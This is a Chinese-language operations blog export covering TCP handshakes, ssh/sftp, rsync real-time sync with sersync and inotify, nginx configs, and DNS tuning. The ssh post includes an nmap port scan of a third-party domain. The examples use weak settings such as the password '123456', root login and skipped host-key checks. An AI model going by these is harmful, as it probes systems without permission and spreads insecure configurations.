1234567891011URG：此标志表示TCP包的紧急指针域（后面马上就要说到）有效，用来保证TCP连接不被中断，并且督促中间层设备要尽快处理这些数据；ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中；有两个取值：0和1，为1的时候表示应答域有效，反之为0；PSH：这个标志位表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序，而不是在缓冲区中排队；RST：这个标志表示连接复位请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包；SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN&#x3D;1，ACK&#x3D;0；连接被响应的时候，SYN&#x3D;1，ACK&#x3D;1；这个标志的数据包经常被用来进行端口扫描。扫描者发送一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口；但是由于这种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全的主机将会强制要求一个连接严格的进行TCP的三次握手；FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。 12345ACK ： TCP协议规定，只有ACK&#x3D;1时有效，也规定连接建立后所有发送的报文的ACK必须为1SYN(SYNchronization) ： 在连接建立时用来同步序号。当SYN&#x3D;1而ACK&#x3D;0时，表明这是一个连接请求报文。对方若同意建立连接，则应在响应报文中使SYN&#x3D;1和ACK&#x3D;1. 因此, SYN置1就表示这是一个连接请求或连接接受报文。FIN （finis）即完，终结的意思， 用来释放一个连接。当 FIN &#x3D; 1 时，表明此报文段的发送方的数据已经发送完毕，并要求释放连接。 三次握手与四次挥手–过程 三次握手 12345678第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。完成了三次握手，客户端和服务器端就可以开始传送数据。 四次挥手 12345678910111213当客户端和服务器通过三次握手建立了TCP连接以后，当数据传送完毕，要断开TCP连接,就有了神秘的“四次分手”。第一次分手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；第二次分手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我“同意”你的关闭请求；第三次分手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入LAST_ACK状态；第四次分手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。至此，TCP的四次分手就这么愉快的完成了。 为什么要三次握手？ 1在谢希仁著《计算机网络》第四版中讲“三次握手”的目的是“为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误”。在另一部经典的《计算机网络》一书中讲“三次握手”的目的是为了解决“网络中存在延迟的重复分组”的问题。 为什么要四次分手？ 12345678910111213那四次分手又是为何呢？TCP协议是一种面向连接的、可靠的、基于字节流的运输层通信协议。TCP是全双工模式，这就意味着，当主机1发出FIN报文段时，只是表示主机1已经没有数据要发送了，主机1告诉主机2，它的数据已经全部发送完毕了；但是，这个时候主机1还是可以接受来自主机2的数据；当主机2返回ACK报文段时，表示它已经知道主机1没有数据发送了，但是主机2还是可以发送数据到主机1的；当主机2也发送了FIN报文段时，这个时候就表示主机2也没有数据要发送了，就会告诉主机1，我也没有数据要发送了，之后彼此就会愉快的中断这次TCP连接。如果要正确的理解四次分手的原理，就需要了解四次分手过程中的状态变化。FIN_WAIT_1: 这个状态要好好解释一下，其实FIN_WAIT_1和FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2状态还有时常常可以用netstat看到。（主动方）FIN_WAIT_2：上面已经详细解释了这种状态，实际上FIN_WAIT_2状态下的SOCKET，表示半连接，也即有一方要求close连接，但另外还告诉对方，我暂时还有点数据需要传送给你(ACK信息)，稍后再关闭连接。（主动方）CLOSE_WAIT：这种状态的含义其实是表示在等待关闭。怎么理解呢？当对方close一个SOCKET后发送FIN报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。接下来呢，实际上你真正需要考虑的事情是察看你是否还有数据发送给对方，如果没有的话，那么你也就可以 close这个SOCKET，发送FIN报文给对方，也即关闭连接。所以你在CLOSE_WAIT状态下，需要完成的事情是等待你去关闭连接。（被动方）LAST_ACK: 这个状态还是比较容易好理解的，它是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，也即可以进入到CLOSED可用状态了。（被动方）TIME_WAIT: 表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。如果FINWAIT1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。（主动方）CLOSED: 表示连接中断。 参考原文：github","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"OSI7层网络模型","slug":"OSI7层网络模型","permalink":"https://garywu520.github.io/tags/OSI7%E5%B1%82%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/"},{"name":"OSI","slug":"OSI","permalink":"https://garywu520.github.io/tags/OSI/"},{"name":"TCP","slug":"TCP","permalink":"https://garywu520.github.io/tags/TCP/"},{"name":"UDP","slug":"UDP","permalink":"https://garywu520.github.io/tags/UDP/"},{"name":"网络模型","slug":"网络模型","permalink":"https://garywu520.github.io/tags/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/"},{"name":"底层核心","slug":"底层核心","permalink":"https://garywu520.github.io/tags/%E5%BA%95%E5%B1%82%E6%A0%B8%E5%BF%83/"},{"name":"三次握手","slug":"三次握手","permalink":"https://garywu520.github.io/tags/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/"},{"name":"四次挥手","slug":"四次挥手","permalink":"https://garywu520.github.io/tags/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/"},{"name":"HTTP","slug":"HTTP","permalink":"https://garywu520.github.io/tags/HTTP/"},{"name":"socket","slug":"socket","permalink":"https://garywu520.github.io/tags/socket/"},{"name":"套接字","slug":"套接字","permalink":"https://garywu520.github.io/tags/%E5%A5%97%E6%8E%A5%E5%AD%97/"}]},{"title":"ssh命令","slug":"ssh命令","date":"2017-08-26T08:17:22.000Z","updated":"2017-08-26T10:48:47.987Z","comments":true,"path":"2017/08/26/ssh命令/","link":"","permalink":"https://garywu520.github.io/2017/08/26/ssh%E5%91%BD%E4%BB%A4/","excerpt":"ssh服务连接工具： 123CRT xshellvnc软件可以支持远程连接图形化界面xmanger软件知识远程连接图形（配置简单）","text":"ssh服务连接工具： 123CRT xshellvnc软件可以支持远程连接图形化界面xmanger软件知识远程连接图形（配置简单） 查看ssh服务属于哪个软件包 ​ rpm -qf “which ssh” 启动ssh 12&#x2F;usr&#x2F;sbin&#x2F;sshd #开启sshd守护进程&#x2F;etc&#x2F;initd&#x2F;sshd start ssh特点 私钥用来解密公钥 公钥可以用来公网传输，私钥务必自行妥善保存。 SSH V2 版本比SSH V1要安全 已知端口号，查询服务 123456nmap -p 22 172.16.1.41nmap -p 1-1024 www.baidu.comlsof -i:22netstat -lntup |grep 22ss -lntup |grep 22nc www.baidu.com 22 SSH配置文件 123456789# vim &#x2F;etc&#x2F;ssh&#x2F;sshd_configPort 52113 #端口号设置（取值范围建议：1024-65534）ListenAddress 10.0.0.0&#x2F;24 #设置ssh监听本地网卡地址（默认监听本机所有网卡）PermitRootLogin yes #是否允许root登陆#开启以下选项会影响SSH连接速度和效率。UseDNS no #是否通过反向解析IP地址对应的主机名。GSSAPIAuthentication no #开启此选项会影响ssh连接效率 启动ssh 1&#x2F;etc&#x2F;init.d&#x2F;sshd restart ssh参数 123456[root@nfs01 conf]# ssh -o StrictHostKeyChecking&#x3D;no 192.168.56.31# 启用“-o StrictHostKeyChecking&#x3D;no”参数跳过yes&#x2F;no的询问。Warning: Permanently added &#39;192.168.56.31&#39; (RSA) to the list of known hosts.root@192.168.56.31&#39;s password: Last login: Sun Aug 6 11:08:33 2017 from 192.168.56.1 邙牛阵法: 解决ssh安全问题 不给业务服务器分配外网IP地址 iptables封闭无关端口 开启SSH，改端口只监听本地内网IP 最小化安装/授权 给系统的重要文件或命令做一个指纹 SSH命令 1234567891011121314151617格式： ssh -p220 user@ipssh -p22 192.168.56.41 -p使用固定端口进行ssh登陆； 不加登陆用户的时候，以当前用户登陆。ssh 192.168.56.41 &quot;free -m&quot; ssh远程管理--不登陆服务器就查看远程服务器信息示例：查看远程服务器的内存信息[root@nfs01 ~]# ssh 192.168.56.31 &quot;free -m&quot;root@192.168.56.31&#39;s password: total used free shared buffers cachedMem: 1990 780 1209 0 21 626-&#x2F;+ buffers&#x2F;cache: 133 1857Swap: 1535 0 1535 sftp1234567891011sftp命令：lls --查看本地服务器当前登录目录信息ls --查看远程服务器登录目录下信息lcd --切换本地服务器目录cd --切换远程服务器目录lpwd --查看本地目录结构pwd --查看远程目录结构put 数据 --推送本地数据到远程服务器目录中get 数据 --拉取远程数据到本地服务器目录中bye --退出sftphelp --显示sftp命令信息 1234567891011121314[root@nfs01 .ssh]# sftp -oPort&#x3D;22 192.168.56.8sftp&gt; put known_hostsUploading known_hosts to &#x2F;root&#x2F;known_hostsknown_hosts 100% 1180 1.2KB&#x2F;s 00:00 sftp&gt; lsanaconda-ks.cfg install.log install.log.syslog sftp&gt; llsknown_hostssftp&gt; pwdRemote working directory: &#x2F;rootsftp&gt; lpwdLocal working directory: &#x2F;root&#x2F;.ssh","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"sftp","slug":"sftp","permalink":"https://garywu520.github.io/tags/sftp/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"telnet","slug":"telnet","permalink":"https://garywu520.github.io/tags/telnet/"}]},{"title":"sersync+rsync实时同步","slug":"sersync+rsync实时同步","date":"2017-08-26T06:15:01.000Z","updated":"2017-08-26T08:13:46.201Z","comments":true,"path":"2017/08/26/sersync+rsync实时同步/","link":"","permalink":"https://garywu520.github.io/2017/08/26/sersync+rsync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/","excerpt":"sersync项目介绍 1Github发布: https:&#x2F;&#x2F;github.com&#x2F;wsgzao&#x2F;sersync","text":"sersync项目介绍 1Github发布: https:&#x2F;&#x2F;github.com&#x2F;wsgzao&#x2F;sersync 原理 下载 解压 12345unzip sersync_installdir_64bit.zipmv sersync_installdir_64bit &#x2F;usr&#x2F;local&#x2F;sersynccd &#x2F;usr&#x2F;local&#x2F;sersyncmv sersync&#x2F;* .&#x2F;rm sersync -rf 目录结构 123bin目录保存的是sersync可用的命令conf目录保存的是配置文件logs目录保存的是log文件，默认空 编辑sersync配置文件 12cd bin&#x2F; &amp;&amp; chmod +x bin&#x2F;sersync #赋予命令可执行权限cd conf&#x2F; &amp;&amp; cp confxml.xml confxml.xml.bak 123456789101112131415161718192021222324252627282930313233343536373839404142434445vim vim confxml.xml#开启debug信息。&lt;debug start&#x3D;&quot;true&quot;&#x2F;&gt;#inotify&lt;inotify&gt; &lt;delete start&#x3D;&quot;true&quot;&#x2F;&gt; &lt;createFolder start&#x3D;&quot;true&quot;&#x2F;&gt; &lt;createFile start&#x3D;&quot;false&quot;&#x2F;&gt; &lt;moveTo start&#x3D;&quot;true&quot;&#x2F;&gt; &lt;attrib start&#x3D;&quot;false&quot;&#x2F;&gt; &lt;modify start&#x3D;&quot;false&quot;&#x2F;&gt;&lt;&#x2F;inotify&gt;#rsync同步信息配置&lt;rsync&gt; &lt;commonParams params&#x3D;&quot;-az&quot;&#x2F;&gt; &lt;auth start&#x3D;&quot;true&quot; users&#x3D;&quot;rsync_backup&quot; passwordfile&#x3D;&quot;&#x2F;etc&#x2F;rsync.password&quot;&#x2F;&gt; &lt;userDefinedPort start&#x3D;&quot;false&quot; port&#x3D;&quot;874&quot;&#x2F;&gt;&lt;!-- port&#x3D;874 --&gt; &lt;timeout start&#x3D;&quot;false&quot; time&#x3D;&quot;100&quot;&#x2F;&gt;&lt;!-- timeout&#x3D;100 --&gt; &lt;ssh start&#x3D;&quot;false&quot;&#x2F;&gt;&lt;&#x2F;rsync&gt;#配置rsync服务器主机IP和模块名称（如果本地监控&#x2F;同步的目录如果有多个，需要新增以下字段）&lt;sersync&gt; &lt;localpath watch&#x3D;&quot;&#x2F;backup&quot;&gt; #配置本地监控同步的目录 &lt;remote ip&#x3D;&quot;192.168.56.41&quot; name&#x3D;&quot;backup&quot;&#x2F;&gt; #rsync服务器IP和模块名称 &lt;!--&lt;remote ip&#x3D;&quot;192.168.8.39&quot; name&#x3D;&quot;tongbu&quot;&#x2F;&gt;--&gt; &lt;!--&lt;remote ip&#x3D;&quot;192.168.8.40&quot; name&#x3D;&quot;tongbu&quot;&#x2F;&gt;--&gt; &lt;&#x2F;localpath&gt; &lt;rsync&gt; &lt;commonParams params&#x3D;&quot;-az&quot;&#x2F;&gt; &lt;auth start&#x3D;&quot;true&quot; users&#x3D;&quot;rsync_backup&quot; passwordfile&#x3D;&quot;&#x2F;etc&#x2F;rsync.password&quot;&#x2F;&gt; &lt;userDefinedPort start&#x3D;&quot;false&quot; port&#x3D;&quot;874&quot;&#x2F;&gt;&lt;!-- port&#x3D;874 --&gt; &lt;timeout start&#x3D;&quot;false&quot; time&#x3D;&quot;100&quot;&#x2F;&gt;&lt;!-- timeout&#x3D;100 --&gt; &lt;ssh start&#x3D;&quot;false&quot;&#x2F;&gt; &lt;&#x2F;rsync&gt; #重传机制，每隔多久进行重传，单位:分钟&lt;failLog path&#x3D;&quot;&#x2F;tmp&#x2F;rsync_fail_log.sh&quot; timeToExecute&#x3D;&quot;60&quot;&#x2F;&gt;&lt;!--default every 60mins execute once--&gt; 启动sersync服务 1234567891011121314.&#x2F;bin&#x2F;sersync -h #查看帮助####################################################参数-d:启用守护进程模式参数-r:在监控前，将监控目录与远程主机用rsync命令推送一遍c参数-n: 指定开启守护线程的数量，默认为10个参数-o:指定配置文件，默认使用confxml.xml文件参数-m:单独启用其他模块，使用 -m refreshCDN 开启刷新CDN模块参数-m:单独启用其他模块，使用 -m socket 开启socket模块参数-m:单独启用其他模块，使用 -m http 开启http模块不加-m参数，则默认执行同步程序##################################################### .&#x2F;bin&#x2F;sersync -dro &#x2F;usr&#x2F;local&#x2F;sersync&#x2F;conf&#x2F;confxml.xml 启动 12345678910111213141516171819202122232425262728# sersync命令执行后输出信息[root@nfs01 sersync]# .&#x2F;bin&#x2F;sersync -dro &#x2F;usr&#x2F;local&#x2F;sersync&#x2F;conf&#x2F;confxml.xmlset the system paramexecute：echo 50000000 &gt; &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;inotify&#x2F;max_user_watchesexecute：echo 327679 &gt; &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;inotify&#x2F;max_queued_eventsparse the command paramoption: -d run as a daemonoption: -r rsync all the local files to the remote servers before the sersync workoption: -o config xml name： &#x2F;usr&#x2F;local&#x2F;sersync&#x2F;conf&#x2F;confxml.xmldaemon thread num: 10parse xml config filehost ip : localhost host port: 8008daemon start，sersync run behind the console use rsync password-file :user is rsync_backuppasswordfile is &#x2F;etc&#x2F;rsync.passwordconfig xml parse successplease set &#x2F;etc&#x2F;rsyncd.conf max connections&#x3D;0 Manuallysersync working thread 12 &#x3D; 1(primary thread) + 1(fail retry thread) + 10(daemon sub threads) Max threads numbers is: 22 &#x3D; 12(Thread pool nums) + 10(Sub threads)please according your cpu ，use -n param to adjust the cpu rate------------------------------------------rsync the directory recursivly to the remote servers onceworking please wait...execute command: cd &#x2F;data &amp;&amp; rsync -az -R --delete .&#x2F; rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.password &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 run the sersync: watch path is: &#x2F;data 传输测试 1231.客户端监控目录与服务端nfs服务器模块目录文件清空2.在客户端监控目录创建文件、统计数量。3.在nfs服务器端查看实时传输的文件 查看进程 123[root@nfs01 backup]# ps -ef |grep sersyncroot 5771 1 0 11:07 ? 00:00:00 .&#x2F;bin&#x2F;sersync -dro &#x2F;usr&#x2F;local&#x2F;sersync&#x2F;conf&#x2F;confxml.xml bug 123sersync+rsync同步的时候，NFS服务端rsync不能使用xinetd来启动，否则会触发bug，导致文件同步异常。NFS服务端rsync需要使用: rsync --daemon的方式启动。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"sersync","slug":"sersync","permalink":"https://garywu520.github.io/tags/sersync/"},{"name":"实时同步","slug":"实时同步","permalink":"https://garywu520.github.io/tags/%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/"},{"name":"sync","slug":"sync","permalink":"https://garywu520.github.io/tags/sync/"}]},{"title":"inotify+rsync实时同步","slug":"inotify+rsync实时同步","date":"2017-08-26T01:48:23.000Z","updated":"2017-08-26T06:05:45.960Z","comments":true,"path":"2017/08/26/inotify+rsync实时同步/","link":"","permalink":"https://garywu520.github.io/2017/08/26/inotify+rsync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/","excerpt":"实时同步原理","text":"实时同步原理 实现实时同步备份数据的过程（从原理方面） 1）部署rsync服务 2）部署inotify监控服务 3）让rsync服务与inotify服务结合(利用脚本结合)。 部署rsync服务 部署rsync服务端 12345678910111213141516171819202122232425262728#检查rsync软件是否安装并安装#配置rsync配置文件 vim &#x2F;etc&#x2F;rsyncd.conf man rsyncd.conf #查看配置帮助 #创建备份目录管理用户 useradd -s &#x2F;sbin&#x2F;nologin -M rsync #创建备份目录 mkdir &#x2F;nfsbackup -p chown -R rsync:rsync &#x2F;nfsbackup # 创建安全认证文件 echo “rsync_bak:123456” &gt;&#x2F;etc&#x2F;rsync.password chmod 600 &#x2F;etc&#x2F;rsync.password #启动rsync服务 rsync --daemon -c &#x2F;etc&#x2F;password ########################################################################################### yum install -y rsync &#x2F;etc&#x2F;init.d&#x2F;xinetd start 说明：有很多服务类似rsync一样没有启动脚本，需要使用命令开启守护进程，因此服务启动停止很麻烦。因此为了解决以上软件的启动停止与重启问题，开发了xinetd服务，将通过命令启动守护进程的命令统一管理起来。 cd &#x2F;etc&#x2F;xinetd.d&#x2F; vim rsync #修改为disable&#x3D;no &#x2F;etc&#x2F;init.d&#x2F;xinetd restart netstat -lntup |grep 873 部署rsync客户端 12345#检查rsync客户端是否安装#编写安全认证文件 echo “123456” &gt;&#x2F;etc&#x2F;rsync.password chmod 600 &#x2F;etc&#x2F;rsync.password# 推送测试 部署inotify服务12软件名称：inotify-tools而sersync是原金山公司周洋在inotify基础上二次开发，多了定时重试机制、过滤机制、支持多线程等。 1PS: yum源仓库搭建：http:&#x2F;&#x2F;blog.oldboyedu.com&#x2F;autodeploy-yum&#x2F; 123456789101112131415161718192021222324安装阿里云普通源与epel源参考：http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;help&#x2F;centos#安装yum install -y inotify-tools#检查[root@nfs01 data]# ls -l &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;inotify&#x2F;total 0-rw-r--r-- 1 root root 0 Aug 6 07:38 max_queued_events-rw-r--r-- 1 root root 0 Aug 6 07:38 max_user_instances-rw-r--r-- 1 root root 0 Aug 6 07:38 max_user_watches[root@nfs01 data]# rpm -ql inotify-tools&#x2F;usr&#x2F;bin&#x2F;inotifywait&#x2F;usr&#x2F;bin&#x2F;inotifywatch[root@nfs01 data]# cd &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;inotify&#x2F;max_user_watches #定义监控文件数量,默认8192max_user_instances #定义每个用户可以运行的实例数量，默认128。max_queued_events #设置inotify实例事件（event）队列容纳的数量，默认:16384。#编写监控命令inotifywait -mrq --format “%w%f” -e moved_to,delete,create,close_write &#x2F;data 参数 123456789101112-e |--event 指定监听1个或多个事件，比如:create,delete。如果省略表示所有事件都监听-d |--daemon 以守护进程方式运行-r |--recursive 递归监控目录数据信息变化-q | --quiet 输出信息少，只打印事件信息-m |--monitor 始终保持事件监听状态--timefmt 指定时间输出格式--format 用自定义的格式显示监控输出的内容。 %w 事件出现时，显示监控的文件或目录名称信息 %f 事件出现时，显示监控的文件或目录的名称信息。 %T 匹配或调用--timefmt语法中输出的时间格式。 %e 事件发生时，不同的事件状态信息之间使用逗号（,）分隔 %Xe 事件发生时，不同的时间状态信息之间使用X分隔 事件 123close_write 文件或目录关闭，在写入模式打开后关闭的move 文件或目录不管移动到货是移动出监控目录都触发事件create 文件或目录创建在监控的目录中就触发事件 1234# 开启inotifywait监控inotifywait &#x2F;data #默认只监控一次inotifywait -m &#x2F;data #始终保持事件监听，但是如果在子目录创建文件不会产生事件，因为没有添加-r参数。inotifywait -mrq &#x2F;data #主要用到的三个参数。 inotify命令格式 常见时间参数信息 1%F 以yy-mm-dd方式显示时间 事件测试 12345678910111213141516171819测试create事件inotifywait -mrq --timefmt &#39;%d&#x2F;%m&#x2F;%y %H:%M&#39; --format &#39;%T %w%f&#39; -e create &#x2F;datainotifywait -mrq --timefmt &#39;%d&#x2F;%m&#x2F;%y %H:%M&#39; --format &#39;%T %w%f 触发事件:%e&#39; -e create &#x2F;data删除delete事件inotifywait -mrq --timefmt &#39;%F&#39; --format &#39;%T %w%f 触发事件:%?e&#39; -e create,delete &#x2F;data修改close_write事件inotifywait -mrq --timefmt &#39;%F&#39; --format &#39;%T %w%f 触发事件:%?e&#39; -e create,delete,close_write &#x2F;data测试moved_to事件[root@inotify_server ~]# inotifywait -mrq --timefmt &#39;%d&#x2F;%m&#x2F;%y %H:%M&#39; --format &#39;%T %w%f&#39; -e moved_to &#x2F;data测试moved_from事件[root@inotify_server ~]# inotifywait -mrq --timefmt &#39;%F&#39; --format &#39;%T %w%f&#39; -e moved_from &#x2F;data#####以我们习惯的时间格式显示：########inotifywait -mrq --timefmt &#39;%F&#39; --format &#39;%T %w%f&#39; -e create &#x2F;data2017-08-06 &#x2F;data&#x2F;dir_02 事件汇总 rsync与inotify脚本结合12345678vim monitor.sh #!&#x2F;bin&#x2F;bash&#x2F;usr&#x2F;bin&#x2F;inotifywait -mrq --format “%w%f” -e moved_to,delete,create,close_write &#x2F;data|\\while read linedo rsync -az --delete &#x2F;data&#x2F; rsync_backup@172.16.1.41::nfsbackup --password-file&#x3D;&#x2F;etc&#x2F;rsync.passworddone –delete 是无差异同步，即同步之前如果两边不一致先清空源数据。 kill扩展123451. kill&#x2F;killall&#x2F;pkill只能杀掉正在后台运行的进程，而后台暂停（ctrl+z）的进程无法杀死2. 需要将后台暂停运行的程序开启，再利用kill杀进程。 jobs fg 序号 #把后台运行的程序放在前台运行 killall sh 将脚本放入后台运行的方式 123451. 在脚本后面放入&amp;符号，表示脚本在后台运行（centos5使用&amp;有bug）2. 利用nohup命令 nohup sh &#x2F;server&#x2F;scripts&#x2F;monitor.sh &amp; jobs查看后台运行的进程3. screen命令实现后台管理服务功能","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"sersync","slug":"sersync","permalink":"https://garywu520.github.io/tags/sersync/"},{"name":"inotify","slug":"inotify","permalink":"https://garywu520.github.io/tags/inotify/"},{"name":"实时同步","slug":"实时同步","permalink":"https://garywu520.github.io/tags/%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/"}]},{"title":"nginx生产环境-案例1","slug":"nginx生产环境-案例1","date":"2017-08-24T08:39:00.000Z","updated":"2018-01-16T12:47:08.646Z","comments":true,"path":"2017/08/24/nginx生产环境-案例1/","link":"","permalink":"https://garywu520.github.io/2017/08/24/nginx%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83-%E6%A1%88%E4%BE%8B1/","excerpt":"研发项目需求：https、环境：php7","text":"研发项目需求：https、环境：php7 80配置 123456789101112131415161718192021222324252627server &#123; listen 1.1.1.1:80; server_name xxx.test.net; #配置主机头；不同主机头可以配置相同端口 proxy_buffers 4 1m; proxy_busy_buffers_size 2m; root &#x2F;var&#x2F;html&#x2F;www&#x2F;xxx.test.net&#x2F;; #代码存放目录 keepalive_timeout 0;# 屏蔽svn信息 location ~ ^(.*)\\&#x2F;\\.svn\\&#x2F; &#123; deny all; &#125; location &#x3D; &#x2F;favicon.ico &#123; access_log off; log_not_found off; &#125; location ~ \\.php$ &#123; fastcgi_pass php5.6; #定义php版本 include fastcgi.conf; &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;xxx.test.net.access_log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;xxx.test.net.net.error_log warn;&#125; 443配置 12345678910111213141516171819202122232425262728293031server &#123; listen 1.1.1.1:443; server_name xxx.test1.net; #配置主机头 root &#x2F;var&#x2F;html&#x2F;www&#x2F;xxx.test1.net&#x2F;; #代码存放目录 ssl on; ssl_certificate &#x2F;var&#x2F;html&#x2F;ssl&#x2F;xxx.net.pem; ssl_certificate_key &#x2F;var&#x2F;html&#x2F;ssl&#x2F;xxx.net.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!RC4:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!EXP:+MEDIUM; ssl_prefer_server_ciphers on;# 屏蔽svn信息 location ~ ^(.*)\\&#x2F;\\.svn\\&#x2F; &#123; deny all; &#125; location &#x3D; &#x2F;favicon.ico &#123; access_log off; log_not_found off; &#125; location ~ \\.php$ &#123; fastcgi_pass php7.1; #定义php版本 include fastcgi.conf; &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;xxx.test1.net.access_log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;xxx.test1.net.net.error_log warn;&#125; nginx定义php版本-目的：让配置文件直接调用 vim /etc/nginx/conf.d/php_version.conf 123456789upstream php5.6 &#123; server unix:&#x2F;var&#x2F;run&#x2F;php5.6-php-fpm1.sock weight&#x3D;100 max_fails&#x3D;10 fa il_timeout&#x3D;30;&#125; upstream php7.1 &#123; server unix:&#x2F;var&#x2F;run&#x2F;php7-php-fpm7.sock weight&#x3D;100 max_fails&#x3D;10 fail_timeout&#x3D;30;&#125; 配置文件语法检查 1234[root@localhost]# nginx -tnginx: the configuration file &#x2F;etc&#x2F;nginx&#x2F;nginx.conf syntax is oknginx: configuration file &#x2F;etc&#x2F;nginx&#x2F;nginx.conf test is successful 优雅重启nginx 1&#x2F;etc&#x2F;init.d&#x2F;nginx -s reload 查看日志 1tailf &#x2F;var&#x2F;log&#x2F;nginx&#x2F;xxx.test1.net.access_log","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"https","slug":"https","permalink":"https://garywu520.github.io/tags/https/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"80","slug":"80","permalink":"https://garywu520.github.io/tags/80/"},{"name":"443","slug":"443","permalink":"https://garywu520.github.io/tags/443/"}]},{"title":"关于DNS集群并发优化-瓶颈结论","slug":"关于DNS集群并发优化-瓶颈结论","date":"2017-08-24T02:28:00.000Z","updated":"2018-08-24T02:38:18.654Z","comments":true,"path":"2017/08/24/关于DNS集群并发优化-瓶颈结论/","link":"","permalink":"https://garywu520.github.io/2017/08/24/%E5%85%B3%E4%BA%8EDNS%E9%9B%86%E7%BE%A4%E5%B9%B6%E5%8F%91%E4%BC%98%E5%8C%96-%E7%93%B6%E9%A2%88%E7%BB%93%E8%AE%BA/","excerpt":"1对三种DNS进行了性能瓶颈优化调优，找出了其性能瓶颈点。测试的DNS 分别是Bind9 、NSD 和unbound","text":"1对三种DNS进行了性能瓶颈优化调优，找出了其性能瓶颈点。测试的DNS 分别是Bind9 、NSD 和unbound DNS优化测试结论123unbound和NSD 均支持so-reuseport参数来调用内核reuseport特性；使用此特性，其qps并发从2万+ 突增到5万+Bind所有版本截止目前(2018.8.24)暂不支持此参数，虽内核支持，但不支持调用。故其qps压测稳定在2.2万+ ，调优方案非常局限 性能瓶颈点123以上DNS的qps性能提升关键点在于如下参数：so-reuseport: yes|no 